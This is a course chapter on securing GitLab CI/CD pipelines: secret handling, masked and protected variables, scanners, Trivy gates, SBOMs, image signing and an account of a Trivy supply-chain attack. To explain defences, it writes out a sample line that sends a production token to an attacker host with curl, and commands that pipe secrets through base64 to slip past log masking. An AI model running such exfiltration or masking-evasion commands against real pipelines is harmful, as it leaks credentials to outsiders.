# 4. Security in pipelines

Your pipeline can now reach a container registry. Soon it will reach a cluster. That makes it a
target. This section covers two things: **not leaking secrets**, and **using automated scanners to find
problems**.

:::{important} This section applies to every project, not only sensitive ones
Every example below is a mistake made by experienced engineers. None of them are exotic attacks.
:::

**Slides:** the slides used in class are in one file, {download}`day04-git-cicd-gitops.pdf`.

(secrets-rule)=
## 4.1 The only rule about secrets

> **A secret committed to Git must be treated as compromised.**

Once a token is committed, it is in the history of every clone, every fork, every CI fetch and every
backup, forever. Deleting the file in a later commit changes nothing about the past.

```{mermaid}
flowchart TB
    A[A token is committed] --> B[git push]
    B --> C[Every clone has it]
    B --> D[Every CI job fetches it]
    B --> E[Backups keep it]
    C --> F[Deleting it later changes nothing]
    D --> F
    E --> F
    F --> G[Rotating it is the only fix]
    style G fill:#ffe6e6,stroke:#c00,color:#5c0a0a
```

:::{note} Jargon: *rotate*
To **rotate** a credential is to invalidate the old one and issue a new one. It is the only thing
that undoes an exposure, because it makes the leaked string worthless.
:::

### Three real leaks

**Leak 1: the token in the remote URL.** A clone made with an access token in the URL stores it
in `.git/config`:

```ini
[remote "origin"]
	url = https://user:glpat-XXXXXXXXXXXXXXXXXXXX@gitlab.example.com/team/project.git
```

It works. And now the token is in a plain-text file, in a cloud-synced folder, and it prints itself
whenever anybody runs `git remote -v`, whether into a screenshot, a chat message, a bug report or a
screen share. Use SSH or a credential helper:

```bash
git remote set-url origin git@gitlab.example.com:team/project.git
# or, for HTTPS with a helper that stores it outside the repo:
git config --global credential.helper store
```

**Leak 2: the credentials file beside the code.** A provisioning repository keeps
`clouds.yaml`, containing a live cloud API credential, in the working directory. It is listed in
`.gitignore`, which prevents the commit but does nothing about the file sitting in a synced folder in
plain text. `.gitignore` is not a security control; it is a convenience.

**Leak 3: the one worth remembering.** A repository whose entire purpose is managing secrets contains
this file:

```yaml
# all secrets should be base64.
kind: Secret
apiVersion: v1
metadata:
  name: vault-approle
data:
  vault-token: NzMwZDNkOTgtN2E0ZS01ZDgwLWU0Y2ItOTIxMjY0MjEwMzA5
type: Opaque
```

:::{danger} Base64 is not encryption
Base64 is an *encoding*: a way of writing bytes using safe characters. It has no key and no secret.
Anyone can reverse it instantly:

```bash
echo 'NzMwZDNkOTgtN2E0ZS01ZDgwLWU0Y2ItOTIxMjY0MjEwMzA5' | base64 -d
```
```text
730d3d98-7a4e-5d80-e4cb-921264210309
```

A Kubernetes `Secret` stores its values base64-encoded purely so binary data survives YAML. It is
**not** protected. A `Secret` in Git is a plaintext secret in Git. This is the single most common
Kubernetes misconception, and it is why [External Secrets](07-fleet.md#secrets) exists.
:::

(d4-4-2)=
## 4.2 Doing it properly in GitLab CI

### Masked and protected variables

Put secrets in *Settings → CI/CD → Variables*, never in `.gitlab-ci.yml`.

Settings pages are divided into sections, closed by default: you open one by clicking its title.

:::{figure} img/ui-gl-settings.png
:alt: The GitLab CI/CD settings page with Settings, CI/CD and the Variables section marked.
**Settings → CI/CD → Variables.** ① The Settings group, ② its CI/CD page, ③ the Variables section:
click its title to open it.
:::

The section lists the project's variables. **Add variable** opens a panel on the right:

:::{figure} img/gitlab-add-variable.png
:alt: The Variables section open, listing GITLAB_TOKEN with Protected and Masked badges, and the Add variable panel on the right with Visibility set to Masked and Protect variable ticked.

**Variables, and the Add variable panel.** ① A saved variable shows its settings as badges: this
`GITLAB_TOKEN` (the release token of [section 5](05-releases.md)) is **Protected** and **Masked**. ② **Visibility →
Masked**. ③ **Flags → Protect variable**. Then fill in **Key** and **Value** below, and click
**Add variable** at the bottom of the panel.
:::

Two settings matter:

| Setting | What it does | Use it? |
|---|---|---|
| **Masked** (under Visibility) | GitLab replaces the value with `[MASKED]` in job logs | Always |
| **Protect variable** (under Flags) | Only exposed to jobs on protected branches/tags | For anything that touches production |

*Masked and hidden* is Masked, plus: once saved, nobody can read the value again in the settings, not
even you. *Visible* prints the value in the logs: never for a secret.

:::{warning} Masking is a safety net with holes
It does simple string replacement on the log. It will not catch a secret you transformed:

```bash
echo "$TOKEN"            # → [MASKED]
echo "$TOKEN" | base64   # → not masked. The secret is in the log.
echo "${TOKEN:0:10}"     # → not masked either.
```

Masking also requires the value to be a single line of at least 8 characters from a limited character
set, so many real secrets do not qualify and will not be masked. **Do not print secrets.**
:::

### Protected branches are the real control

"Protected" only means something if the branch is actually protected. In GitLab 19 branch
protection is set with a **branch rule**: left sidebar **Settings → Repository**, open the
section **Branch rules** (click its title), open the rule for `main` (GitLab creates it with the project; if it is missing: **Add branch rule → Branch
name or pattern**, `main`, **Create branch rule**). On its page, under **Protect branch**, each line has an **Edit** button:

- **Allowed to push and merge: No one.** Everything arrives by merge request.
- **Allowed to merge: Maintainers** (or a specific group).

That is a team's setting. In this course you are the only Maintainer of your projects and push to
`main` yourself, so keep GitLab's default: Maintainers may push and merge.

Now think about why this matters. Consider a job holding a production credential:

```yaml
deploy-prod:
  script:
    - ./deploy.sh          # uses $PROD_TOKEN
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

Anyone who can open a merge request can also *edit `.gitlab-ci.yml` in that merge request*. If
`$PROD_TOKEN` were available on merge-request pipelines, they could add `- curl attacker.com -d
"$PROD_TOKEN"` and steal it. Marking the variable **protected** is what prevents that, because
merge-request branches are not protected.

:::{important} The chain of trust
`protected variable` → only on `protected branch` → which only a merge request, merged by the people
allowed to, can change. Break any link and the credential is available to anybody who can propose a
change.
:::

### Prefer short-lived tokens to stored ones

The best secret is one that does not exist when the job is not running.

You have already used one: `CI_REGISTRY_PASSWORD`. GitLab creates it for each job, and it stops
working when the job ends. Nothing to store, nothing to leak, nothing to rotate. The same is true of
`CI_JOB_TOKEN`, which a job can use to read other projects' code and packages. Use these whenever
they are enough.

A token you create and store yourself, like the **project access token** of
[section 5](05-releases.md), is different: it works until it expires or somebody revokes it.
Compare what happens when each one leaks into a job log:

| Token | Still valid after the leak? |
|---|---|
| `CI_REGISTRY_PASSWORD`, `CI_JOB_TOKEN` | No: it stopped working when the job ended |
| A stored access token | Yes, until its expiry date, possibly months later |

So when you must store one, give it the **shortest expiry** and the **fewest scopes** that work, and
make it Masked and Protected.

### The everyday hygiene list

- Never `echo` a secret, and never `env | sort` without filtering.
- Never pass a secret as a command-line argument, because it appears in `ps` and in shell history. Use an
  environment variable or a file.
- Add `no_log`-style suppression where your tooling has it (Ansible's `no_log: true`, for instance).
- Give each pipeline its *own* credential with minimal scope, so revoking one does not break
  everything and a leak reaches only what that one credential could reach: a small **blast radius**.
- Pin the CI images you use. `image: some/tool:latest` means an attacker who compromises that tag
  runs code in a job that holds your credentials. It happened to Trivy in March 2026: see the
  real case in [section 4.5](#d4-4-5).

(d4-4-3)=
## 4.3 Automated scanning

GitLab ships scanners that are enabled with one line each. They are not optional extras: they catch
things no reviewer reliably catches.

`.gitlab-ci.yml` — enabling the scanners

```yaml
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/SAST-IaC.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml
```

What each one is for:

| Scanner | Finds | Example |
|---|---|---|
| **SAST** | Bugs in *your* source code | SQL built by string concatenation; a hardcoded password |
| **Secret Detection** | Credentials in the repo *and its history* | `glpat-…`, `AKIA…`, a private key |
| **Container Scanning** | Vulnerabilities in your built image | Your base image ships a vulnerable `openssl` |
| **IaC Scanning** | Misconfigured infrastructure code | A Pod running privileged; a security group open to `0.0.0.0/0` |

:::{note} Jargon: *SAST*, *CVE*, *IaC*
**SAST** = Static Application Security Testing: analysing code without running it.

**IaC** = Infrastructure as Code: infrastructure described in text files kept in Git, instead of
created by hand in a web console. Kubernetes manifests, Helm charts, Dockerfiles and Terraform files
are all IaC.

**CVE** = Common Vulnerabilities and Exposures: the public catalog of known flaws. `CVE-2025-1234`
is one specific published vulnerability that tools can look up.
:::

Findings appear directly in the merge request, so the conversation between developers happens before
the merge rather than after an incident.

### IaC scanning: the one that matters most here

Because most of this day is YAML describing infrastructure, this is the scanner most likely to catch a
real mistake.

```yaml
include:
  - template: Security/SAST-IaC.gitlab-ci.yml
```

It finds Kubernetes manifests, Helm charts, Dockerfiles and Terraform files by itself. Under the hood
it runs **KICS**, which carries several hundred rules about Kubernetes, Terraform,
Dockerfiles and Helm charts.

:::{note} Jargon: *KICS*
**KICS** (Keeping Infrastructure as Code Secure) is an open-source scanner, made by the company
Checkmarx, that GitLab uses for IaC scanning. It reads your files without deploying anything and
checks them against rules such as "a container must not run as root" or "a Service must not be open
to the whole internet". Each broken rule becomes a finding, with a severity, in the merge request.
:::

The template GitLab ships for it is short enough to read in full:

```yaml
iac-sast:
  stage: test
  artifacts:
    reports:
      sast: gl-sast-report.json
  variables:
    SEARCH_MAX_DEPTH: 4
  allow_failure: true
  script:
    - /analyzer run

kics-iac-sast:
  extends: iac-sast
  image:
    name: "$SAST_ANALYZER_IMAGE"
  variables:
    SAST_ANALYZER_IMAGE: "$SECURE_ANALYZERS_PREFIX/kics:4"
```

Note `allow_failure: true`: findings are reported but do not block. That is the right starting point,
because a scanner that blocks from day one on an existing codebase is switched off within a week.
Tighten it later, one severity at a time.

### Be honest about false positives

Scanners report things that are not real problems. The professional response is to *record the
decision*, not to disable the scanner:

```yaml
variables:
  SAST_EXCLUDED_PATHS: "spec, test, tests, tmp"    # test fixtures contain fake secrets on purpose
```

If you dismiss a finding in the GitLab UI, write down why. "We looked at this and it is fine because
X" is useful to the next person; silence is not.

(d4-4-4)=
## 4.4 Supply chain: trusting other people's code

A pipeline runs code written by other people: base images, CI images, libraries and templates. Each is
a route in.

**Pin by digest for anything sensitive.** A tag can be moved. A digest cannot.

:::{note} Jargon: *digest*
An image's **digest** is a fingerprint of its content: a hash, written `sha256:` followed by 64
hexadecimal characters, computed from the image's bytes (you met it on
[Day 2](../day02/02-storage-and-images.md)). Change a single byte and the digest changes. A **tag**
such as `3.12-slim` is only a name that points to a digest, and whoever controls the repository can
point it somewhere else tomorrow. Writing `image@sha256:…` asks for those exact bytes, forever.
:::

```dockerfile
# A tag: whoever controls the repo can change what this means tomorrow
FROM python:3.12-slim

# A digest: cryptographically exactly these bytes, forever
FROM python:3.12-slim@sha256:<digest>
```

Get the real digest with `docker buildx imagetools inspect python:3.12-slim` (the `Digest:` line),
or from the registry's web page.

The trade-off is real. A pinned digest does not pick up security fixes on its own, so something has to
raise merge requests bumping it: Renovate, Dependabot or a scheduled pipeline. Pinned and never
updated is its own vulnerability.

**Keep credentials away from the jobs that run other people's code.** The build job runs
`pip install`, a base image and Kaniko: third-party code. It must not see the deployment credential.
Stages and `needs:` do not do this: every job in the pipeline receives every CI/CD variable it is
allowed to see, whatever its stage. What does it is the variable's **environment scope**: in
*Settings → CI/CD → Variables*, set *Environment scope* to `production`. Only jobs with
`environment: production` receive it, so the build job never does. Add *Protect variable*, and it
reaches only pipelines on protected branches as well.

(d4-4-5)=
## 4.5 Trivy

The GitLab templates in [section 4.3](#d4-4-3) are convenient because they need one line each. Underneath, the
container scanner is running an open-source scanner, and it is worth knowing that scanner
directly. It runs anywhere, including on a laptop, and it is the tool most projects reach for when the
built-in templates do not fit.

:::{note} Jargon: *Trivy*
**Trivy** is an open-source scanner from Aqua Security. It reads an image, a filesystem or a set of
configuration files, compares what it finds against a vulnerability database, and reports the matches.
It has no agent and no server: it is a single binary with a database it downloads.
:::

### Three modes

Trivy scans three different kinds of thing, and confusing them is the usual first mistake.

`trivy image` inspects a **built container image**, layer by layer, and reports vulnerable operating
system packages and application dependencies:

```bash
trivy image python:3.12-slim
```

`trivy fs` inspects a **directory**, reading lock files such as `requirements.txt`,
`package-lock.json` or `go.sum`. It answers a question about the source tree rather than the image:

```bash
trivy fs .
```

`trivy config` inspects **configuration files**: Dockerfiles, Kubernetes manifests, Terraform, Helm
charts. This is misconfiguration scanning rather than vulnerability scanning, so it finds a container
running as root rather than a vulnerable library:

```bash
trivy config .
```

The third mode has a use that is easy to miss. A Helm chart is a template, so scanning the chart
directory only checks the template. Rendering it first checks what will actually be applied:

```bash
helm template my-release ./chart > rendered.yaml
trivy config rendered.yaml
```

### Making it a gate

By default Trivy reports and exits successfully. Two flags turn a report into a gate:

```bash
trivy image \
  --severity CRITICAL,HIGH \
  --exit-code 1 \
  my-registry.example.com/my-app:abc123
```

`--severity` selects what is reported, and `--exit-code 1` makes the job fail when anything at those
severities is found.

Doing this naively stops all work, for a reason worth understanding. A base image such as
`python:3.12-slim` normally carries a handful of vulnerabilities in distribution packages for which
**no patched version exists yet**. Failing on those means nobody can deploy anything until a
maintainer upstream publishes a fix. The flag that resolves it:

```bash
trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 my-app:abc123
```

`--ignore-unfixed` reports only vulnerabilities that have a fixed version available, which is exactly
the set the team can act on.

For the residue, findings can be accepted explicitly in a `.trivyignore` file:

`.trivyignore`

```text
# Accepted 2026-10-12, review by 2026-12-01.
# Affects a code path this service never calls; upstream fix expected in 2.9.
CVE-2025-12345
```

:::{important} An accepted finding needs a date and a reason
A bare list of CVE identifiers becomes permanent by accident. Recording why each one was accepted, and
when it should be reconsidered, is the difference between a decision and a silent exemption.
:::

### Two enforcement styles

Both of the following are used in practice, and the difference matters more than the tool
configuration.

**Report first.** Scan with `--exit-code 0`, publish the report as an artifact, and let the team read
it. Nothing is blocked. This is the right starting point for an existing codebase, because a gate
introduced on day one against a long backlog is switched off within a week.

**Fail the merge request.** Scan the image built from the branch with `--exit-code 1` before it can be
merged. Nothing vulnerable is ever promoted, and the cost of a finding is paid by whoever introduced
it, while the change is still fresh.

The second is stronger and only workable once the backlog is clear. Moving from the first to the
second, severity by severity, is a reasonable plan; starting at the second on a legacy codebase is
not.

`.gitlab-ci.yml` — reporting on every branch, gating the default branch

```yaml
security-audit:
  stage: scan
  needs: [build-container-image]
  image:
    name: aquasec/trivy:0.69.3
    entrypoint: [""]
  variables:
    # A cache means the vulnerability database is not downloaded on every run.
    TRIVY_CACHE_DIR: "$CI_PROJECT_DIR/.cache/trivy"
  cache:
    key: trivy-db
    paths: [.cache/trivy]
  script:
    # Always produce a readable report.
    - trivy image --severity CRITICAL,HIGH --format table
        --output trivy-report.txt "$IMAGE"
    # Gate only where a failure is actionable.
    - |
      if [ "$CI_COMMIT_BRANCH" = "$CI_DEFAULT_BRANCH" ]; then
        trivy image --severity CRITICAL,HIGH --ignore-unfixed \
          --exit-code 1 "$IMAGE"
      fi
  artifacts:
    when: always
    expire_in: 1 week
    paths: [trivy-report.txt]
```

Two details in that job are the ones people forget. The vulnerability database is a few hundred
megabytes, so caching it saves a download on every pipeline. And the image is pinned to a version:
`aquasec/trivy:latest` means the scanner can change without anybody choosing to change it, which is
the same argument made in [section 4.4](#d4-4-4) about pinning dependencies. This is not a theoretical risk, and
the scanner itself is the proof.

:::{warning} A real case: the Trivy supply-chain attack, March 2026
On **19 March 2026** attackers who had stolen Aqua Security's credentials published a malicious
Trivy release, **v0.69.4**, to GitHub, Docker Hub and the other registries. On Docker Hub they also
pushed malicious **`0.69.5`** and **`0.69.6`** images, and **moved `latest`** to their image several
times, even after the first cleanup. In the same attack they force-pushed 76 of the 77 version tags of
the `trivy-action` GitHub Action to malicious code. The payload was an infostealer: it ran before the
real scan and sent the job's CI/CD secrets, cloud credentials, SSH keys and Kubernetes tokens to the
attackers. It was tracked as **CVE-2026-33634**; the bad images were removed on 23 March.

Who was hit, and who was not:

- A pipeline using **`aquasec/trivy:latest`** in those days ran the attackers' code, with access to
  every secret of the job.
- A pipeline pinned to **`0.69.3`**, the version in this course, was not affected: it is the last
  clean release, and the one the advisories told everybody to go back to.

A tag pin protected you this time only because the attackers published *new* tags. With the Docker
Hub credentials they had, they could have moved `0.69.3` as well. Only a digest cannot be moved,
which is why [section 4.4](#d4-4-4) says to pin anything sensitive by digest, and a scanner that holds your
registry credentials is sensitive:

```yaml
image:
  name: aquasec/trivy:0.69.3@sha256:bcc376de8d77cfe086a917230e818dc9f8528e3c852f7b1aff648949b6258d1c
```

Sources: [the Trivy security advisory](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23)
and [Docker's account of the Docker Hub images](https://www.docker.com/blog/trivy-supply-chain-compromise-what-docker-hub-users-should-know/).
:::

## 4.6 ⌨️ Hands-on 5: catch a leaked secret, then make Trivy a gate

⏱ **About 20 minutes** for both parts.

Two exercises on your own pipeline: one for the secrets rule of [section 4.1](#secrets-rule), one for the scanner of
[section 4.5](#d4-4-5).

### Part A: let the pipeline find a secret before a reviewer has to

Turn on GitLab's secret detection. The template's job is called `secret_detection`. Overriding two of
its settings puts it in the `test` stage your pipeline already has, and keeps its report as a file you
can open (the template declares it only as a report, which has no **Browse** button, as in
[section 3.4](#d4-3-4)).

```bash
cd ~/climate-service
git switch main && git pull
git switch -c ci/secret-detection
```

Add to the top of `.gitlab-ci.yml`:

```yaml
include:
  - template: Security/Secret-Detection.gitlab-ci.yml

secret_detection:
  stage: test
  artifacts:
    paths: [gl-secret-detection-report.json]
```

```bash
git commit -am "ci: scan every push for committed secrets"
git push -u origin ci/secret-detection
```

Merge it once the pipeline is green. Now leak something **fake**, on purpose, on a throwaway branch:

```bash
git switch main && git pull
git switch -c test/leak-on-purpose          # from main, which now has the scanner
cat > settings.py <<'EOF'
# Do NOT do this. This token is fake; it only has the shape of a real one.
GITLAB_TOKEN = "glpat-Xq3vR8sT1uW4yZ6aB9cD"
EOF
git add settings.py
git commit -m "test: commit a fake token to see the scanner react"
git push -u origin test/leak-on-purpose
```

:::{note} The push itself may be refused
If the GitLab instance has *secret push protection* enabled, the push fails with a message naming the
token. That is the strongest version of this control: the secret never reaches the server. Read the
message, then skip to the clean-up below.
:::

When the pipeline finishes, open the `secret_detection` job, press **Browse** in the right sidebar
and click `gl-secret-detection-report.json`. GitLab shows the file. Under `vulnerabilities`, each
finding names what was found and where; the parts that matter here:

```json
{
  "name": "GitLab personal access token",
  "location": { "file": "settings.py", "start_line": 2 }
}
```

Notice that the job is **green**. The template reports; it does not block. The report is all you
get, and somebody has to read it.

Now answer: if that token had been real, what would you do next?

:::{dropdown} Answer
Revoke the token in GitLab and issue a new one. Deleting `settings.py` in a new commit does not help:
the token is in the history of the branch, on the server, and in every clone. This is [section 4.1](#secrets-rule) in
practice. Rewriting history afterwards is hygiene, not the fix.
:::

Clean up. The token is fake, so deleting the branch is enough:

```bash
git switch main
git branch -D test/leak-on-purpose
git push origin --delete test/leak-on-purpose
```

### Part B: turn the Trivy report into a gate

Watch a gate fail before you add one. An old base image is full of vulnerabilities with fixes
available, so this exits with `1`:

```bash
docker run --rm aquasec/trivy:0.69.3 image --quiet \
  --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 python:3.9-slim-buster
echo "exit code: $?"
```

Exit code 1 is what fails a CI job. Now apply the same flags to your pipeline:

```bash
git switch -c ci/trivy-gate
```

Replace the `security-audit` job:

```yaml
security-audit:
  stage: scan
  needs: [build-container-image]
  image:
    name: aquasec/trivy:0.69.3              # pinned: the scanner changes only when you choose
    entrypoint: [""]
  variables:
    # The registry is private, so Trivy must log in to pull the image it scans.
    TRIVY_USERNAME: "$CI_REGISTRY_USER"
    TRIVY_PASSWORD: "$CI_REGISTRY_PASSWORD"
    TRIVY_CACHE_DIR: "$CI_PROJECT_DIR/.cache/trivy"
  cache:
    key: trivy-db
    paths: [.cache/trivy]
  script:
    - trivy image --no-progress --severity HIGH,CRITICAL
        --format table --output trivy-report.txt "${IMAGE}"
    - trivy image --no-progress --severity HIGH,CRITICAL
        --ignore-unfixed --exit-code 1 "${IMAGE}"
  artifacts:
    when: always
    expire_in: 1 week
    paths: [trivy-report.txt]
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

Two things changed besides the flags. `allow_failure: true` is gone, so a finding now turns the
pipeline red. `GIT_STRATEGY: none` is gone too, because Trivy reads `.trivyignore` from the checkout.
The registry login stays as it was in Hands-on 4 (`TRIVY_USERNAME`, `TRIVY_PASSWORD`): the registry
is private, so without it Trivy could not pull the image it scans.

```bash
git commit -am "ci: fail the pipeline on fixable HIGH and CRITICAL findings"
git push -u origin ci/trivy-gate
```

Merge, and read the `security-audit` job on `main`. One of two things happens:

- **Green.** Your base image has no fixable HIGH or CRITICAL findings today. The gate is in place
  for the day it does.
- **Red.** Read `trivy-report.txt`. Usually a newer patch release of the base image fixes it: rebuild
  on the latest `python:3.12-slim-bookworm`. If not, and you have checked that the finding does not
  affect this service, accept it in a `.trivyignore` file with a date and a reason, as shown in
  [section 4.5](#d4-4-5), and commit that through a merge request.

**Checkpoint 5** — you saw `secret_detection` report the fake token, and `security-audit` on `main`
now fails whenever a fixable HIGH or CRITICAL vulnerability reaches the image.

:::{dropdown} `security-audit` fails with `UNAUTHORIZED` or `401`
`TRIVY_USERNAME` and `TRIVY_PASSWORD` are missing or misspelled: compare with the job in Hands-on 4.
With them, Trivy uses the same short-lived job credentials Kaniko used to push.
:::

## 4.7 Software bills of materials

[Section 4.4](#d4-4-4) was about the code you did not write. An SBOM is the list of it, for one image. Trivy,
already in your pipeline, produces one:

```bash
trivy image --format cyclonedx --output sbom.json "$IMAGE"
```

:::{note} Jargon: *SBOM*, *CycloneDX*, *SPDX*
An **SBOM** (Software Bill of Materials) is a machine-readable inventory of everything inside an
artifact: every package, its version, and its license.

**CycloneDX** and **SPDX** are the two standard formats. Either is fine; consistency matters more than
the choice.
:::

The value is not the file, it is the question the file answers. When a widely-used library is found to
be vulnerable, the only question is which of an organization's images contain it. With SBOMs stored
per build, that is a query. Without them, it is an audit.

```bash
# Which builds shipped the affected package?
jq -r '.components[] | select(.name == "log4j-core") | .version' sbom.json
```

Storing the SBOM as a pipeline artifact alongside the image, keyed by the same commit SHA, is enough
to make this work:

```yaml
sbom:
  stage: scan
  needs: [build-container-image]
  image:
    name: aquasec/trivy:0.69.3
    entrypoint: [""]
  variables:
    TRIVY_USERNAME: "$CI_REGISTRY_USER"
    TRIVY_PASSWORD: "$CI_REGISTRY_PASSWORD"
  script:
    - trivy image --format cyclonedx --output sbom-$CI_COMMIT_SHORT_SHA.json "$IMAGE"
  artifacts:
    paths: [sbom-$CI_COMMIT_SHORT_SHA.json]
    expire_in: 1 year
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

This is an artifact in the sense of [section 3.4](#d4-3-4): a result you would lose, not just time, if it
disappeared. Keep it at least as long as the image may run anywhere.

## 4.8 Signing an image

Everything so far establishes that an image is *sound*. Nothing so far establishes that it is *the
image the pipeline built*.

A registry tag is mutable, and anyone with push access can replace what a tag points at. Pinning by
digest, from [section 4.4](#d4-4-4), fixes the mutability but not the provenance: a digest identifies bytes, not
who produced them. Signing closes that gap.

:::{note} Jargon: *cosign*, *Sigstore*, *digest*, *keyless signing*
**Sigstore** is an open-source project for signing software, and **cosign** is its tool for container
images. cosign stores the signature in the registry, next to the image, so whoever can pull the image
can also check it.

A signature covers a **digest** (`sha256:…`), never a tag: the tag can move, the signed bytes cannot.

**Keyless signing** is cosign's other mode: no key pair to keep; the pipeline proves who it is to
Sigstore's public services, which issue a certificate valid for a few minutes. Those services must be
able to check the pipeline's identity with GitLab, which they cannot do for a self-hosted GitLab like
this one. This section uses a key pair.
:::

**Once, as a Maintainer:** make a key pair, and give the private key to the pipeline only. cosign is
installed on your training VM, so you can try these commands there.

```bash
cosign generate-key-pair             # asks for a password; writes cosign.key and cosign.pub
git add cosign.pub                   # the public key goes in the repository, for verification
```

In **Settings → CI/CD → Variables**, add `COSIGN_PRIVATE_KEY` (the content of `cosign.key`) and
`COSIGN_PASSWORD`, both **Protected**, so only pipelines on protected branches can sign. Then delete
`cosign.key` from your disk.

**In the pipeline:** the build job writes the image's digest to a file and passes it on as an
artifact. The sign job signs that digest.

`.gitlab-ci.yml` — the digest, then the signature

```yaml
build-container-image:
  # ... as in Hands-on 4, plus:
  script:
    - /kaniko/executor --context "$CI_PROJECT_DIR" --dockerfile "$CI_PROJECT_DIR/Dockerfile"
      --destination "$IMAGE" --digest-file image-digest
  artifacts:
    paths: [image-digest]

sign-image:
  stage: scan
  needs: [build-container-image]
  image:
    name: gcr.io/projectsigstore/cosign:v2.4.1-dev   # -dev: the plain image has no shell (3.12)
    entrypoint: [""]
  script:
    - cosign login "$CI_REGISTRY" -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD"
    - cosign sign --yes --tlog-upload=false --key env://COSIGN_PRIVATE_KEY
      "$CI_REGISTRY_IMAGE@$(cat image-digest)"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

`--tlog-upload=false` keeps the signature out of Sigstore's public log: the image names stay inside
the organisation.

**Verify** before deploying, with the public key from the repository:

```bash
cosign verify --key cosign.pub --insecure-ignore-tlog=true \
  gitlab.data.meditwin-project.eu:6443/<group>/<project>@sha256:<digest>
```

It succeeds only if the image was signed with the matching private key, which only the pipeline on a
protected branch can use. An image pushed by hand, even under the same tag, fails.

The same key attaches the SBOM to the image, so the inventory travels with it instead of living in a
pipeline archive. In `sign-image`, add the `sbom` job of 4.7 to `needs:`, so its file arrives as an
artifact, and one more line to `script:`:

```bash
cosign attest --yes --tlog-upload=false --key env://COSIGN_PRIVATE_KEY \
  --type cyclonedx --predicate "sbom-$CI_COMMIT_SHORT_SHA.json" "$CI_REGISTRY_IMAGE@$(cat image-digest)"
```

## 4.9 Human gates

Not everything should be automatic. Combine three things for a production deployment:

```yaml
deploy-prod:
  stage: deploy
  script:
    - ./deploy.sh production
  environment:
    name: production
    url: https://my-app.internal.meditwin-project.eu
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual              # 1. a human must click
      allow_failure: false      # 2. and the pipeline waits for them
```

Until somebody presses ▶ on `deploy-prod`, the pipeline is *blocked*: not green, nothing after it
runs. That is what makes it a gate. With `allow_failure: true` the pipeline would go green without
anyone approving, and the gate would be fake ([section 3.8](#d4-3-8) shows both cases).

The third piece decides **who** may press ▶. A manual job runs on a branch, and only users who are
allowed to merge or push to that branch may run it. So protect `main` with a branch rule (**Settings
→ Repository → Branch rules**, [section 4.2](#d4-4-2)) with *Allowed to merge* and *Allowed to push and merge*
set to the people who may deploy, for example **Maintainers**. Developers then see `deploy-prod` waiting, but cannot
start it.

The `environment:` keyword records each deployment under **Operate → Environments**, and lets you give
the job credentials that no other job sees: a CI/CD variable with *Environment scope* `production`
reaches only jobs with `environment: production` ([section 4.4](#d4-4-4)).

A real infrastructure pipeline goes further and gates destructive Terraform jobs on the
**commit message**:

```yaml
destroy-cluster:
  rules:
    - if: $CI_COMMIT_MESSAGE =~ /suicide mission/
      when: manual              # inside rules: allow_failure defaults to false, so this blocks
```

You cannot destroy the cluster by accidentally clicking the wrong button — you would have to have
written a specific phrase in the commit message first. The guard is unusual, and effective:
the guard is *in the change itself*, reviewable in the merge request.

## 4.10 Core takeaway

> **Secrets never go in Git, and scanners in the pipeline catch what reviewers miss — but only a
> scanner that can fail the pipeline is a gate.**

- **A secret in Git is compromised. Rotate it.** `.gitignore` prevents; it does not fix.
- **Base64 is not encryption.** A Kubernetes `Secret` in Git is plaintext in Git.
- Secrets go in **masked + protected** CI variables, and masking is a leaky net — do not print them.
- The chain is **protected variable → protected branch → reviewed merge request**. Any broken link
  exposes production to anyone who can propose a change.
- Prefer **short-lived** credentials (the job's own `CI_JOB_TOKEN`, `CI_REGISTRY_PASSWORD`) over stored ones; give stored tokens a short expiry and few scopes.
- Turn on **SAST, Secret Detection, Dependency, Container and IaC scanning** — one `include:` line
  each, `allow_failure: true` to begin with.
- **Pin your dependencies** and have a process to update them.
- **Trivy** scans three different things: `image` for a built image, `fs` for a source tree, `config`
  for manifests and Dockerfiles. Render a Helm chart before scanning it.
- Make a scan a gate with `--exit-code 1`, and use **`--ignore-unfixed`** so unpatchable base-image
  findings do not block every deployment.
- Start by **reporting**, move to **failing the merge request** once the backlog is clear.
- An **SBOM** turns "are we affected by this CVE?" from an audit into a query.
- **Signing** establishes who produced an image. A digest identifies bytes; a signature identifies the
  pipeline that built them.

## 4.11 Check yourself

1. You pushed a commit containing an API key, noticed within 30 seconds, and immediately pushed
   another commit removing it. Are you safe? What do you do?
2. A variable is Masked but not Protected. A colleague opens a merge request from a fork that adds
   `- echo "$PROD_TOKEN" | base64` to the pipeline. What happens?
3. Your team wants to add `allow_failure: false` to container scanning so vulnerable images cannot be
   published. Good idea? What breaks?

:::{dropdown} Solutions
**1.** **No.** The key is in the first commit, that commit is on the server, and anything that fetched
in those 30 seconds has it — including CI. Public repositories are scraped by bots continuously;
minutes is plenty. Do this, in order:
1. **Rotate the key immediately.** Revoke it at the provider, issue a new one. This is the fix;
   everything else is cleanup.
2. Put the new one in a masked+protected CI variable, and add the file to `.gitignore`.
3. Check the provider's audit log for use of the old key.
4. Optionally rewrite history (`git filter-repo`) so it stops showing up in scans — but only *after*
   rotating, and knowing that anyone who already cloned still has it.

**2.** They get the token. `base64` defeats masking (it is plain string replacement on the log), and
because the variable is not Protected, GitLab exposes it to a pipeline on an unprotected branch. This
is the exact scenario Protected variables exist for. Also: for fork merge requests, check *Settings →
CI/CD → "Run pipelines for fork merge requests"* — by default GitLab is cautious here, and you should
not loosen it.

**3.** Good intention, and it will hurt if done bluntly, because container scanners report
vulnerabilities in the **base image** that you often cannot fix. `python:3.12-slim` will have a
handful of medium-severity Debian CVEs with no patch available on any given day, so a blanket
`allow_failure: false` means nobody can deploy anything until upstream Debian ships a fix. Do it
gradually instead:
- Fail only on `Critical` and `High` with a **fix available** (`CS_SEVERITY_THRESHOLD`).
- Keep everything else reporting but non-blocking.
